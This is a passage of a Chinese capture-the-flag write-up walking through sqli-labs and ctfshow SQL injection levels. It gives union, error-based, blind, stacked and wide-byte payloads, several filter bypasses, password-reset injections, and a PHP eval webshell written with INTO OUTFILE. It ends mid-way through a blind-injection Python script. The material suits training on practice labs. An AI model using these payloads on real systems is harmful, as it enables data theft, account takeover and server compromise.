1" and (updatexml(1,concat(0x7e,(select group_concat(password) from security.users),0x7e),1))#
```

## Less15~16

思路与 Less-14 一致，首先得闭合 sql 语句，使用 " ' ') ") 等等之类的来判断

## Less-17

部分题目源码，密码重置缺陷

```php
<?php
............
function check_input($value)
	{
	if(!empty($value))
		{
		// truncation (see comments)
		$value = substr($value,0,15);
		}
		// Stripslashes if magic quotes enabled
		if (get_magic_quotes_gpc()) //agic_quotes_gpc开启时用于在预定义字符（单引号、双引号、斜杠、NULL）前加上反斜杠
			{
			$value = stripslashes($value);
			}
		// Quote if not a number
		if (!ctype_digit($value))
			{
			$value = "'" . mysql_real_escape_string($value) . "'";
			}
	else
		{
		$value = intval($value);
		}
	return $value;
	}
.............
// take the variables
if(isset($_POST['uname']) && isset($_POST['passwd']))

{
//making sure uname is not injectable
$uname=check_input($_POST['uname']);  
$passwd=$_POST['passwd'];  //用户名被check_input 包裹了，而密码没有
// connectivity 
@$sql="SELECT username, password FROM users WHERE username= $uname LIMIT 0,1";

$result=mysql_query($sql);
$row = mysql_fetch_array($result);
//echo $row;
	if($row)
	{
  		//echo '<font color= "#0000ff">';	
		$row1 = $row['username'];  	
		//echo 'Your Login name:'. $row1;
		$update="UPDATE users SET password = '$passwd' WHERE username='$row1'";
		mysql_query($update);
  		echo "<br>";

...
```

我们直接重置 test 用户的密码，重置为 zf1yolo，发现直接重置成功

<img src="图片\Snipaste_2023-01-22_20-38-33.png" alt="Snipaste_2023-01-22_20-38-33" style="zoom:80%;" />

## Less-18

部分题目源码

```php
.......
$uagent = $_SERVER['HTTP_USER_AGENT'];
$IP = $_SERVER['REMOTE_ADDR'];
echo 'Your IP ADDRESS is: ' .$IP;
$uname = check_input($_POST['uname']);
$passwd = check_input($_POST['passwd']);
........
$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
	$result1 = mysql_query($sql);
	$row1 = mysql_fetch_array($result1);
if($row1)
			{
........
			$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
			mysql_query($insert);
...........	
			echo 'Your User Agent is: ' .$uagent;
		
			print_r(mysql_error());			
........
			}
		else
			{
........
			print_r(mysql_error());
.........
			}

	}
```

先用已知账号密码 test:zf1yolo 登录，看看 ip 和 ua头 被写进了 uagents 表中

<img src="图片\Snipaste_2023-01-22_20-54-18.png" alt="Snipaste_2023-01-22_20-54-18" style="zoom:67%;" />

<img src="图片\Snipaste_2023-01-22_20-54-50.png" alt="Snipaste_2023-01-22_20-54-50" style="zoom: 80%;" />

再配合报错注入

```
1',1,extractvalue(1,concat(0x7e,(database()),0x7e)))#
```

拼接后的 sql 语句为

```
INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('1',1,extractvalue(1,concat(0x7e,(database()),0x7e)))#', '$IP', $uname)
```

<img src="图片\Snipaste_2023-01-22_21-27-25.png" alt="Snipaste_2023-01-22_21-27-25" style="zoom:80%;" />

## Less-19

题目部分源码，头部的Referer POST报错注入，与上题类似，此时在 REFERER 处回显

```
	$uagent = $_SERVER['HTTP_REFERER'];
	$IP = $_SERVER['REMOTE_ADDR'];
	...........
	if($row1)
			{
			echo '<font color= "#FFFF00" font size = 3 >';
			$insert="INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')";
			mysql_query($insert);
			//echo 'Your IP ADDRESS is: ' .$IP;
				
			echo 'Your Referer is: ' .$uagent;
		
			print_r(mysql_error());			
		
			}
```

正常登录时

<img src="图片\Snipaste_2023-01-23_10-50-00.png" alt="Snipaste_2023-01-23_10-50-00" style="zoom:80%;" />

```
1' and extractvalue(1,concat(0x7e,(database()),0x7e)) and '
```

在 REFERER 处插入报错注入，注意闭合 sql

```
$insert="INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('1' and extractvalue(1,concat(0x7e,(database()),0x7e)) and '', '$IP')";
```

<img src="图片\Snipaste_2023-01-23_10-54-25.png" alt="Snipaste_2023-01-23_10-54-25" style="zoom:80%;" />

## Less-20

部分题目源码，与 Less-19 时思路一致，在 COOKIE 处插入报错注入

```
.................
$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
		$result1 = mysql_query($sql);
		$row1 = mysql_fetch_array($result1);
		$cookee = $row1['username'];
		........
			echo "YOUR USER AGENT IS : ".$_SERVER['HTTP_USER_AGENT'];	
			echo "YOUR IP ADDRESS IS : ".$_SERVER['REMOTE_ADDR'];	
		.........	
			if($row1)
				{
				setcookie('uname', $cookee, time()+3600);	
				header ('Location: index.php');
				echo "I LOVE YOU COOKIES";
				//echo 'Your Cookie is: ' .$cookee;
				print_r(mysql_error());					
				}
	............
$sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";
			$result=mysql_query($sql);	
if (!$result)
  				{
  				die('Issue with your mysql: ' . mysql_error());
  				}
			$row = mysql_fetch_array($result);
			if($row)
				{
			  	echo 'Your Login name:'. $row['username'];
			  	echo "<br>";
				echo 'Your Password:' .$row['password']		
				echo 'Your ID:' .$row['id'];
			  	} 
    ..................            
```

先用账号密码 test:zf1yolo 登录时，返回如下

<img src="图片\Snipaste_2023-01-23_11-02-38.png" alt="Snipaste_2023-01-23_11-02-38" style="zoom:80%;" />

在 cookie 处插入注入语句

```
uname=-test' union select 1,database(),user(),4,5,6 #
```

<img src="图片\Snipaste_2023-01-23_11-21-35.png" alt="Snipaste_2023-01-23_11-21-35" style="zoom: 67%;" />

此时 sql 语句拼接为

```
$sql="SELECT * FROM users WHERE username='-test' union select 1,database(),user(),4,5,6 #' LIMIT 0,1";
```

## Less-21

与上题源码大致一致，此时 COOKIE 是用 base64 解码的，COOKIE编码注入

```
$cookee = base64_decode($cookee);
			echo "<br></font>";
			$sql="SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1";
			$result=mysql_query($sql);
			if (!$result)
  				{
  				die('Issue with your mysql: ' . mysql_error());
  				}
			$row = mysql_fetch_array($result);
			if($row)
				{		
			  	echo 'Your Login name:'. $row['username'];
				echo 'Your Password:' .$row['password'];
				echo 'Your ID:' .$row['id'];
...................				
```

我们常规登录后，修改注入的 cookie 为 base64 编码后的，注意闭合 sql 语句时用的 ')

```
-test') union select 1,database(),user(),4,5,6 #
```

闭合 sql 语句为

```
$sql="SELECT * FROM users WHERE username=('-test') union select 1,database(),user(),4,5,6 #') LIMIT 0,1";
```

把 payload 用 base64 编码为

```
LXRlc3QnKSB1bmlvbiBzZWxlY3QgMSxkYXRhYmFzZSgpLHVzZXIoKSw0LDUsNiAj
```

<img src="图片\Snipaste_2023-01-23_11-39-43.png" alt="Snipaste_2023-01-23_11-39-43" style="zoom:67%;" />

## Less-22

与上题类似，只是闭合 sql 语句时用的 "

```
$sql="SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1";
```

使用上题 payload 变换一下下

```
-test" union select 1,database(),user(),4,5,6 #
```

拼接后的 sql 为

```
$sql="SELECT * FROM users WHERE username=-test" union select 1,database(),user(),4,5,6 # LIMIT 0,1";
```

把 payload 用 base64 编码，然后放入 COOKIE 里即可

```
LXRlc3QiIHVuaW9uIHNlbGVjdCAxLGRhdGFiYXNlKCksdXNlcigpLDQsNSw2ICM=
```

## Less-23

查看部分源码，过滤注释的GET型，把 -- 与 # 替换成了空

```
$id=$_GET['id'];

//filter the comments out so as to comments should not work
$reg = "/#/";
$reg1 = "/--/";
$replace = "";
$id = preg_replace($reg, $replace, $id);
$id = preg_replace($reg1, $replace, $id);
..............
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```

注释符被过滤了，我们就使用原始的闭合 sql 语句的方法，观察源码中 sql 语句使用 ' " ) 等等之类的，如下 payload 闭合成功

```
?id=1' and '1' = '1
```

闭合后的 sql 语句为

```
$sql="SELECT * FROM users WHERE id='1' and '1' = '1' LIMIT 0,1";
```

如下联合union注入

```
?id=-1' union select 1,database(),user(),4,5,'6
```

<img src="图片\Snipaste_2023-01-23_12-07-16.png" alt="Snipaste_2023-01-23_12-07-16" style="zoom:67%;" />

## Less-24

二次注入,二次注入的原理

 在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，但是 addslashes 有一个特点就是虽然参数在过滤后会添加 “\” 进行转义，但是“\”并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。 在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行下一步的检验和处理，这样就会造成 SQL 的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入

<img src="图片\Snipaste_2023-01-23_12-11-58.png" alt="Snipaste_2023-01-23_12-11-58" style="zoom:80%;" />

mysql_escape_string 函数会将特殊字符进行过滤 如' 经过转义就成了\' 然后用 insert into 存入在数据库中

```php
$username=  mysql_escape_string($_POST['username']) ;
$pass= mysql_escape_string($_POST['password']);
$re_pass= mysql_escape_string($_POST['re_password']);
........
$sql = "insert into users ( username, password) values(\"$username\", \"$pass\")";
```

在 login.php 查看源码 登录获取用 mysql_escape_string 对输入的参数进行转义 转义之后在数据库中查找指定的账号和密码 再传入到 session 里

```php
function sqllogin(){
   $username = mysql_real_escape_string($_POST["login_user"]);
   $password = mysql_real_escape_string($_POST["login_password"]);
   $sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
//$sql = "SELECT COUNT(*) FROM users WHERE username='$username' and password='$password'";
   $res = mysql_query($sql) or die('You tried to be real smart, Try harder!!!! :( ');
   $row = mysql_fetch_row($res);
	//print_r($row) ;
   if ($row[1]) {
			return $row[1];
   } else {
      		return 0;
   }
}
...............
$login = sqllogin();
if (!$login== 0) 
{
	$_SESSION["username"] = $login;
	setcookie("Auth", 1, time()+3600);  /* expire in 15 Minutes */
	header('Location: logged-in.php');
} 
```

pass_change.php 源码里，$_SESSION['username'] 复制给$username 无任何过滤再带入 UPDATE 语句中造成注入。整个流程就是注册用户，更改密码时会触法注入。可以看到二次注入笔记隐蔽。通常发生在更改，需要二次带入数据时提交的功能里

<img src="图片\Snipaste_2023-01-23_12-18-44.png" alt="Snipaste_2023-01-23_12-18-44" style="zoom: 80%;" />

先注册一个正常的用户 admin:123456

<img src="图片\Snipaste_2023-01-23_12-48-04.png" alt="Snipaste_2023-01-23_12-48-04" style="zoom:67%;" />

在注册一个恶意用户 admin'#:1234567，当我们修改用户 admin'# 的密码时，修改的就是用户 admin 的密码

<img src="图片\Snipaste_2023-01-23_12-53-49.png" alt="Snipaste_2023-01-23_12-53-49" style="zoom:80%;" />

拼接的 sql 为

```
$sql = "UPDATE users SET PASSWORD='$pass' where username='admin '#' and password='$curr_pass' ";
```

使用账号 admin‘# 登录后，修改它的密码为 zf1yolo

<img src="图片\Snipaste_2023-01-23_13-01-38.png" alt="Snipaste_2023-01-23_13-01-38" style="zoom:67%;" />

发现账号 admin 的密码已经被修改为 zf1yolo，我们可以用它登录成功

<img src="图片\Snipaste_2023-01-23_13-03-52.png" alt="Snipaste_2023-01-23_13-03-52" style="zoom:67%;" />

## Less-25

重要源码如下，GET型过滤了or和and

```php
$id=$_GET['id'];
$id= blacklist($id);
............
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
	$result=mysql_query($sql);
	$row = mysql_fetch_array($result);
	if($row)
	{	
	  	echo 'Your Login name:'. $row['username'];	  
	  	echo 'Your Password:' .$row['password'];	
  	}
	else 
	{
		print_r(mysql_error()); 
	}
...............
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/AND/i',"", $id);		//Strip out AND (non case sensitive)
	return $id;
}
```

单次过滤，使用双写试试，infoorrmation_schema.tables 里我们双写了 oorr ，替换 or 为空 剩下的还是 or

```
?id=-1' union select 1,2,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema='security'),4,5,6 --+
```

<img src="图片\Snipaste_2023-01-23_13-31-55.png" alt="Snipaste_2023-01-23_13-31-55" style="zoom:67%;" />

双写 and 为 anandd

```
?id=1' anandd 1=1 --+
```

<img src="图片\Snipaste_2023-01-23_13-33-22.png" alt="Snipaste_2023-01-23_13-33-22" style="zoom:67%;" />

使用union联合注入，把语句中的 or 与 and 双写即可

## Less-25a

过滤了or和and的盲注，与 Less-5 盲注的思路一样，就是把 payload 中的 and 和 or 双写即可

这个是有回显的，使用 union 注入也可以，直接闭合 sql 语句不需要 ' 啥的

```
?id=-1 union select 1,2,3,4,5,6  --+
```

## Less-26

过滤了注释和空格的注入，重要源码

```php
	$id=$_GET['id'];
	$id= blacklist($id);
	$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
	$result=mysql_query($sql);
	$row = mysql_fetch_array($result);
	if($row)
	{
	  	echo 'Your Login name:'. $row['username'];
	  	echo 'Your Password:' .$row['password'];
  	}
  	else 
	{
		print_r(mysql_error());   //报错函数
	}
  	.................
  	function blacklist($id) //过滤函数
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
	$id= preg_replace('/[--]/',"", $id);		//Strip out --
	$id= preg_replace('/[#]/',"", $id);			//Strip out #
	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
	$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
	return $id;
}
```

<img src="图片\Snipaste_2023-01-23_14-15-10.png" alt="Snipaste_2023-01-23_14-15-10" style="zoom:67%;" />

两个空格代替一个空格，用 Tab 代替空格，%a0=空格，使用 url 编码

```
%20 %09 %0a %0b %0c %0d %a0 %00 /**/ /*!*/ %0A
```

```
%09 TAB 键（水平） 
%0a 新建一行 
%0c 新的一页 
%0d return 功能 
%0b TAB 键（垂直） 
%a0 空格
%0A
```

可以将**空格字符替换成注释** 

```
/**/
```

 还可以使用

```
 /*!这里的根据 mysql 版本的内容不注释*/
```

```
select * from users where id=1 /*!union*//*!select*/1,2,3,4;
```

试试用之前报错注入的 payload 来修改，这里使用 ' 来闭合 sql 语句的首尾，%00应该是截断

```
?id=1'anandd(updatexml(1,concat(0x7e,database(),0x7e),1))anandd'1'='1
```

```
?id=1'anandd(updatexml(1,concat(0x7e,database(),0x7e),1));%00
```

<img src="图片\Snipaste_2023-01-23_14-47-04.png" alt="Snipaste_2023-01-23_14-47-04" style="zoom:67%;" />

## Less-26a

过滤了空格和注释的盲注

```
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
```

sql 语句闭合用 ') 即可，这题没用报错函数 `print_r(mysql_error());` 我的环境有问题，空格用 %0A 代替

```
?id=1')anandd'1'=('1
```

## Less-27

过滤了 union 和 select，我们大小写绕过

```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
...........
function blacklist($id)
{
$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
$id= preg_replace('/[--]/',"", $id);		//Strip out --.
$id= preg_replace('/[#]/',"", $id);			//Strip out #.
$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
$id= preg_replace('/select/m',"", $id);	    //Strip out spaces.
$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
$id= preg_replace('/union/s',"", $id);	    //Strip out union
$id= preg_replace('/select/s',"", $id);	    //Strip out select
$id= preg_replace('/UNION/s',"", $id);	    //Strip out UNION
$id= preg_replace('/SELECT/s',"", $id);	    //Strip out SELECT
$id= preg_replace('/Union/s',"", $id);	    //Strip out Union
$id= preg_replace('/Select/s',"", $id);	    //Strip out select
return $id;
}
```

```
?id=1'and(updatexml(1,concat(0x7e,database(),0x7e),1))and'1'='1
```

```
?id=9991'%0AUNioN%0ASelEct%0a1,2,3,4,5,6;%00
```

空格用 %0A 代替，大小写绕过 SelEct

```
?id=1'and(updatexml(1,concat(0x7e,(SeLeCt%0Agroup_concat(password)%0Afrom%0Asecurity.users),0x7e),1))and'1'='1
```

<img src="图片\Snipaste_2023-01-23_15-12-56.png" alt="Snipaste_2023-01-23_15-12-56" style="zoom:80%;" />

## Less28~29

闭合 sql 时不一样，与前几题的思路一致，大小写 双写 %0A绕空格 等等

## Less-30

```
?id=1"union select 1,2,3,4,5,6--+
```

## Less-31

```
?id=1")union select 1,2,3,4,5,6--+
```

## Less-32

Bypass addslashes()

```
function check_addslashes($string)
{
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);  //escape any backslash
    $string = preg_replace('/\'/i', '\\\'', $string);            //escape single quote with a backslash
    $string = preg_replace('/\"/', "\\\"", $string);           //escape double quote with a backslash          
    return $string;
}
```

**宽字节注入**，在 SQL 进行防注入的时候，一般会开启 gpc，过滤特殊字符。 一般情况下开启 gpc 是可以防御很多字符串型的注入，但是如果数据库编码不对，也可以导致SQL 防注入绕过，达到注入的目的。如果数据库设置宽字节字符集 **gbk** 会导致宽字节注入，从而逃逸gpc 

前提条件:数据库编码与 PHP 编码设置为不同的两个编码那么就有可能产生宽字节注入

<img src="图片\Snipaste_2023-01-23_15-25-47.png" alt="Snipaste_2023-01-23_15-25-47" style="zoom:67%;" />

我们发现他都是被转义的
因为数据库是gbk编码，那么，我们可以进行宽字节注入了
我们尝试%df'，然后将浏览器编码改为gbk，我们可以看到，他变成了汉字

这是因为加上反斜杠也就是%5c之后传入参数整体为%df%5c%27，而前面说过，在mysql里认为前两个字符是一个汉字，也就是‘運’，而后面的单引号就逃逸出来了
**宽字节注入的本质是PHP与MySQL使用的字符集不同，只要低位的范围中含有0x5c的编码，就可以进行宽字节注入**

```
宽字节检测较为简单       输入%df%27      检测即可或者使用配合 and 1=1 检测即可
-1%df%27%20and%201=1--+           页面是否存在乱码
-1%df%27%20or%20sleep(10)--+               页面是否存在延时
均可以测试存在宽字节注入
-1%df%27%20union%20select%201,version(),database()--+
```

```
?id=-1%df' union select 1,2,3,4,5,6 --+
```

<img src="图片\Snipaste_2023-01-23_15-30-37.png" alt="Snipaste_2023-01-23_15-30-37" style="zoom:67%;" />

## Less-33

与上一关一致，只不过换成了addslashe函数

```
function check_addslashes($string)
{
    $string= addslashes($string);    
    return $string;
}
```

```
addslashes() 函数
函数返回在预定义字符之前添加反斜杠的字符串。
单引号（’）
双引号（"）
反斜杠（\）
NULL
```

```
?id=-1%df' union select 1,2,3,4,5,6 --+
```

## Less-33~37

大体上思路与 Less-32 一致，只不过换成 POST

有的使用 mysql_real_escape_string 函数，配合数据库的编码为GBK，所以存在宽字节注入

<img src="图片\Snipaste_2023-01-23_15-39-15.png" alt="Snipaste_2023-01-23_15-39-15" style="zoom:50%;" />

有的是因为注入是数字型的，它的过滤无用

```
function check_addslashes($string)
{
    $string = addslashes($string);
    return $string;
}
$id=check_addslashes($_GET['id']);
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1"; 
```

## Less-38

**堆叠查询**：堆叠查询可以执行多条 SQL 语句，语句之间以分号(;)隔开，而堆叠查询注入攻击就是利用此特点，在第二条语句中构造要执行攻击的语句。

在 mysql 里 **mysqli_multi_query()** 和 **mysql_multi_query()** 这两个函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔

但是堆叠查询**只能返回第一条查询信息，不返回后面的信息**

```
 select version();select database() 
```

堆叠注入的危害是很大的，可以**任意使用增删改查的语句**，例如删除数据库、修改数据库、添加数据库用户，以下是题目重要部分源码

```php
$id=$_GET['id'];
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
.................
if (mysqli_multi_query($con1, $sql))
{
    
    if ($result = mysqli_store_result($con1))
    {
        if($row = mysqli_fetch_row($result))
        {

            printf("Your Username is : %s", $row[1]);
          
            printf("Your Password is : %s", $row[2]);
          
        }
          // mysqli_free_result($result);
    }
}
```

顺便我们把 test 账号的密码改了

```
?id=1';update users set password='12345' where username='test' ;--+
```

<img src="图片\Snipaste_2023-01-23_16-02-26.png" alt="Snipaste_2023-01-23_16-02-26" style="zoom:80%;" />

拼接的 sql 为

```
$sql="SELECT * FROM users WHERE id='1';update users set password='12345' where username='test' ;--+' LIMIT 0,1";
```

## Less-39

是数字型，拼接 sql 时不同，其它的思路与上题一样

```
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

```
?id=1;update users set password='123456' where username='test';--+ 
```

## Less-40

用 ') 闭合sql，其它的与 Less-38 一致

```
?id=1');update users set password='12345678' where username='test';--+ 
```

## Less-41

本关是无报错，其余同39关一样

## Less-42

部分重要源码,POST的堆叠注入

```
 $sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
   if (@mysqli_multi_query($con1, $sql))
   ..............
```

POST提交

```
test
11';update users set password='123' where username='test';--+ 
```

<img src="图片\Snipaste_2023-01-23_16-15-49.png" alt="Snipaste_2023-01-23_16-15-49" style="zoom:50%;" />

看到 test 的密码被我们改成了 123

<img src="图片\Snipaste_2023-01-23_16-15-18.png" alt="Snipaste_2023-01-23_16-15-18" style="zoom:80%;" />

## Less43~45

大致思路与 Less-42一致，就是闭合 sql 时有所不同 ，用  ')  ") ) 等等之类的闭合 sql 语句前面，用注释注释掉 sql 语句后面即可

## Less-46

order by 注入，部分重要源码

```php
$id=$_GET['sort'];
$sql = "SELECT * FROM users ORDER BY $id";
	$result = mysql_query($sql);
..............
while ($row = mysql_fetch_assoc($result))
			{		
    			echo "<td>".$row['id']."</td>";
    			echo "<td>".$row['username']."</td>";
    			echo "<td>".$row['password']."</td>";
			}	
		}
		else
		{
		print_r(mysql_error());
		}
```

发现可以降序升序排列

```
?sort=1 desc
```

<img src="图片\image-20230123162923910.png" alt="image-20230123162923910" style="zoom:67%;" />

试试报错注入

```
?sort=(extractvalue(1,concat(0x7e,(select user()),0x7e)))#
```

<img src="图片\Snipaste_2023-01-23_16-32-04.png" alt="Snipaste_2023-01-23_16-32-04" style="zoom:67%;" />

试试延时盲注，发现有明显延时感觉

```
?sort=1 and sleep(10)
```

试试写文件

<img src="图片\Snipaste_2023-01-23_16-36-52.png" alt="Snipaste_2023-01-23_16-36-52" style="zoom:80%;" />

```
?sort=1 into outfile "D:\\phpstudy\\WWW\\sqli-labs\\Less-46\\test.php" lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+
```

<img src="图片\Snipaste_2023-01-23_16-41-58.png" alt="Snipaste_2023-01-23_16-41-58" style="zoom:80%;" />

## Less47~53

与 Less-46 思路大致相同，还是闭合 sql 是有些不一样，再是配合堆叠注入，无法使用报错注入等等

# ctfshow

## web171

### 方法一

union 联合查询

```
//拼接sql语句查找指定ID用户
$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

查询数据库，库名为 ctfshow_web

```
-1' union select 1,database(),3 --+
```

查询表，表名为 ctfshow_user

```
-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web')--+
```

查询表中字段名，为 id,username,password

```
-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='ctfshow_user')--+
```

查询 ctfshow_user 表中的数据

```
-1' union select 1,2,(select group_concat(username,password) from ctfshow_web.ctfshow_user)--+
```

### 方法二

万能密码，输出了所有数据

```
1' or 1=1 --+
```

### 方法三

```
 -1' or username = 'flag
```

拼接后的 sql 语句为

```
$sql = "select username,password from user where username !='flag' and id = ' -1' or username = 'flag' limit 1;";
```

## web172

### 题目

查询语句

```
//拼接sql语句查找指定ID用户
$sql = "select username,password from ctfshow_user2 where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

返回逻辑

```
//检查结果是否有flag
    if($row->username!=='flag'){
      $ret['msg']='查询成功';
    }    
```

### 方法一

让返回的结果中不能有 flag 即可，可以使用编码

```
-1' union select to_base64(username),hex(password) from ctfshow_user2 --+
```

### 方法二

由于屏蔽的是username,所以只需找出password即可get flag 

```
-1' union select 1,password from ctfshow_user2--+
```

## web173

### 题目

查询语句

```
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user3 where username !='flag' and id = '".$_GET['id']."' limit 1;";     
```

返回逻辑

```
//检查结果是否有flag
    if(!preg_match('/flag/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```

### 答案

```
-1' union select 1,2,password from ctfshow_user3--+
```

```
-1' union select to_base64(username),hex(password),3 from ctfshow_user3 --+
```

## web174

#### 题目

```
//查询语句
//拼接sql语句查找指定ID用户
$sql = "select username,password from ctfshow_user4 where username !='flag' and id = '".$_GET['id']."' limit 1;";
      
//返回逻辑
//检查结果是否有flag，同时过滤了数字
    if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```

#### 答案

查询数据库名 ctfshow_web

```
-1' union select 'a',database()--+
```

运用 replace() 函数替换 数字为其它的字符，一直替换完 1~9，b.password   中， b 为我们为表 ctfshow_user4 起的别名

```
replace(b.password,"1","!")
```

#### 思路二

根据以下测试语句的回显构造盲注

```
1' and 1=1--+     //返回页面有 admin 字符串
1' and 1=2--+     //返回页面有 无数据 字符串
```

```
1' OR 1=1 -- +    //OR后面条件为真，页面返回userAUTO
1' OR 1=2 -- +    //OR后面条件为假，页面返回不包含userAUTO
// 用 like 替换 or也行              
```

测试一下，发现数据库长度为 11

```
1' and 1=if(length(database())=11,1,0) --+
```

这个仍要替换结果中的数字

## web175

### 题目

sql 语句无过滤，但是回显的值有过滤

```
//查询语句
//拼接sql语句查找指定ID用户
$sql = "select username,password from ctfshow_user5 where username !='flag' and id = '".$_GET['id']."' limit 1;";
      
//返回逻辑
//检查结果是否有flag
    if(!preg_match('/[\x00-\x7f]/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }      
```

sql 注入写文件，把 password 写到文件里再查看，就无所谓返回值被过滤了

```
1' union select 1,password from ctfshow_user5 into outfile '/var/www/html/1.txt' --+
```

<img src="图片\Snipaste_2023-01-24_12-23-01.png" alt="Snipaste_2023-01-24_12-23-01" style="zoom:67%;" />

也可以写shell

```
1' union select 1,"<?php eval($_POST[1]); ?>" into outfile '/var/www/html/2.php' --+
```

<img src="图片\Snipaste_2023-01-24_12-30-22.png" alt="Snipaste_2023-01-24_12-30-22" style="zoom:67%;" />

## web176

### 题目

过滤传入参数，查询语句

```
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";
      
```

返回逻辑

```
//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
```

### 方法一

对输入参数进行过滤，试试万能密码，发现显示了 flag

```
1' or '1
```

### 方法二

经过测试，好像过滤了 # select ，大小写试试

```
-1'  union SeLect 1,2,password from  ctfshow_user--+
```

### 方法三

```
-1'  or username = 'flag'--+
```

##  web177

对传入的参数进行了过滤，好像**过滤了空格**，试试 /**/ 代替 空格

```
1'/**/union/**/select/**/password,1,1/**/from/**/ctfshow_user/**/where/**/username/**/='flag'%23
```

适当使用反引号 ` 和单引号 ' 也可以代替空格

```
1'union/**/select'1',2,(select`password`from`ctfshow_user`where`username`='flag');%23
```

## web178

一样好像过滤了空格和*，/**/ 代替空格已经不能用了，这次使用 url 编码试试,使用 %09 %0b 等等都行

可以见之前的 sqli-labs 的 Less-26

```
1'union%09select'1',2,3%23
```

```
1'union%09select'1',(select`password`from`ctfshow_user`where`username`='flag'),3%23
```

```
1'or'1'='1'%23
```

## web179

一样过滤了空格，我们还是用 url 编码 ，此时用 %0c

```
1'or'1'='1'%23
```

```
1'union%0cselect'1',(select`password`from`ctfshow_user`where`username`='flag'),3%23
```

## web180

使用如下可以成功回显，但是没有 flag 值，可能过滤了注释符

```
99991'or'1'='1
```

答案

```
-1'or%0cusername%0clike'flag
```

```
-1'union%0cselect'1',(select`password`from`ctfshow_user`where`username`='flag'),'3
```

## web181

### 题目

题目有问题，x0c 还可以使用

```
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i', $str);
  }
```

### 答案

```
-1'or%0cusername%0clike'flag
```

```
id=-1'or(id=26)and'1'='1
```

```
id=-1'or(username='flag')and'1'='1
```

```
id=-1'or(username='flag')and'1
```

## web182

flag 被过滤了，可以试试模糊查询  like

```
//返回逻辑
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i', $str);
  }
```

```
-1'or%0cusername%0clike'%fla%
```

```
id=-1'or(username%0clike'%fla%')and'1
```

## web183*

### 题目

```
//查询语句
//拼接sql语句查找指定ID用户
  $sql = "select count(pass) from ".$_POST['tableName'].";";
      
//返回逻辑
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i', $str);
  }

//查询结果
//返回用户表的记录总数
      $user_count = 0;
```

### 思路

  我们 POST 提交 tableName=ctfshow_user，发现有回显显示22条

​    <img src="图片\Snipaste_2023-01-24_14-39-32.png" alt="Snipaste_2023-01-24_14-39-32" style="zoom:67%;" />

发现有一条记录

```
tableName=%60ctfshow_user%60where%60pass%60like%22%25f%25%22
```

```
`ctfshow_user`where`pass`like"%f%"
```

我们可以试试盲注，regexp()为正则匹配

```python
# @Author:Y4tacker
import requests

url = 'http://25bab1c0-bb8d-42b6-a644-e5d075213e90.challenge.ctf.show/select-waf.php'
flagstr = r"{flqazwsxedcrvtgbyhnujmikolp-0123456789}"
res = ""
for i in range(1,46):
    for j in flagstr:
        data = {
